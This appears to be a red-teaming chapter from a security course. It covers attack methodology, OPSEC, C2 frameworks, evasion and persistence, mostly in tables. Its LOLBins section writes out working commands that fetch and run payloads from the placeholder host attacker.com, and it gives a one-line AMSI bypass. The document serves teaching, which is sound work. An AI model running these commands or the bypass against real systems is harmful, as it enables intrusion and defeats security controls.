# 🔴 Red Team Operations

## Adversary Emulation — Thinking Like a Real Attacker

---

## Overview

Red Teaming goes beyond penetration testing. It simulates real-world threat actors to test an organization's detection and response capabilities. The focus is on stealth, persistence, and achieving objectives while evading defenses.

---

## Red Team vs Penetration Testing

| Aspect | Penetration Testing | Red Teaming |
|--------|-------------------|-------------|
| Goal | Find vulnerabilities | Test detection/response |
| Scope | Defined targets | Full organization |
| Duration | Days to weeks | Weeks to months |
| Stealth | Not priority | Critical |
| Rules | Strict scope | Goal-based |
| Defenders | Usually aware | Usually unaware (except leadership) |

---

## Red Team Methodology

```
1. Planning & Reconnaissance
   └── Define objectives, rules of engagement, threat model

2. Initial Access
   └── Phishing, exploit public apps, supply chain

3. Execution & Persistence
   └── Execute payloads, establish persistence

4. Privilege Escalation
   └── Local admin → Domain admin

5. Defense Evasion
   └── Bypass AV/EDR, live off the land

6. Credential Access
   └── Kerberoast, dump hashes, keylogging

7. Lateral Movement
   └── Move through network toward objectives

8. Collection & Exfiltration
   └── Find target data, extract it

9. Reporting
   └── Document attack path, timeline, recommendations
```

---

## OPSEC (Operational Security)

### Principles

| Principle | Description |
|-----------|-------------|
| Minimize artifacts | Don't drop unnecessary files |
| Blend in | Use legitimate tools (LOLBins) |
| Encrypted comms | Encrypt C2 traffic |
| Timestomping | Modify file timestamps |
| Log awareness | Know what's logged |
| Avoid detection | Know defender capabilities |

### Living Off the Land (LOLBins)

Use built-in Windows tools to avoid detection:

```powershell
# Download file (instead of dropping malware)
certutil -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe
bitsadmin /transfer job http://attacker.com/payload.exe C:\temp\payload.exe
powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')

# Execute code
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";
mshta http://attacker.com/payload.hta
regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll

# Reconnaissance
nltest /dclist:domain.local
net group "Domain Admins" /domain
systeminfo
```

---

## Command & Control (C2)

### C2 Frameworks

| Framework | Type | Stealth |
|-----------|------|---------|
| Cobalt Strike | Commercial | High (malleable C2) |
| Sliver | Open Source | High |
| Havoc | Open Source | High |
| Mythic | Open Source | Modular |
| Metasploit | Open Source | Lower |
| Empire/Starkiller | Open Source | Medium |

### C2 Communication Channels

| Channel | Stealth | Description |
|---------|---------|-------------|
| HTTPS | High | Blends with normal web traffic |
| DNS | Very High | Encoded in DNS queries |
| Domain Fronting | Very High | Routes through CDN |
| SMB | High | Named pipes (internal) |
| Slack/Teams | Very High | Uses legitimate services |

---

## Evasion Techniques

### AV/EDR Evasion Concepts

| Technique | Description |
|-----------|-------------|
| Obfuscation | Modify code to avoid signatures |
| Encryption | Encrypt payload, decrypt at runtime |
| Process injection | Inject into legitimate process |
| AMSI bypass | Disable PowerShell scanning |
| ETW patching | Disable Event Tracing |
| Syscall direct | Call kernel directly (bypass hooks) |
| Sleep obfuscation | Encrypt beacon during sleep |

### AMSI Bypass (Educational)

```powershell
# Understanding what AMSI does:
# AMSI scans PowerShell, VBScript, JScript before execution
# Bypassing AMSI allows execution of "malicious" scripts

# This is for understanding defense mechanisms
# Real red teams use more sophisticated methods
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## Persistence Mechanisms

| Method | Stealth | Survives Reboot |
|--------|---------|-----------------|
| Registry Run Keys | Low | Yes |
| Scheduled Tasks | Medium | Yes |
| WMI Subscriptions | High | Yes |
| DLL Hijacking | High | Yes |
| Golden Ticket | Very High | Yes (until krbtgt reset) |
| Skeleton Key | High | No (memory only) |
| BITS Jobs | High | Yes |
| COM Hijacking | High | Yes |

---

## Exercises

1. Set up a C2 server (Sliver or Mythic) in your lab
2. Practice phishing campaigns with GoPhish (on your own lab)
3. Develop a payload that bypasses Windows Defender (in isolated lab)
4. Perform a full red team exercise against your AD lab
5. Write an after-action report documenting your attack chain

---

## Recommended Learning

| Resource | Focus |
|----------|-------|
| Red Team Ops (Zero-Point Security) | Cobalt Strike training |
| CRTO Certification | Red team methodology |
| HackTheBox Pro Labs | Multi-machine environments |
| PNPT (TCM Security) | Practical red team cert |
| Offensive Security (OSEP) | Advanced evasion |

---

**Next:** → [16-Digital-Forensics](../16-Digital-Forensics/README.md)

*"A red team's success is measured by what the blue team doesn't detect."*
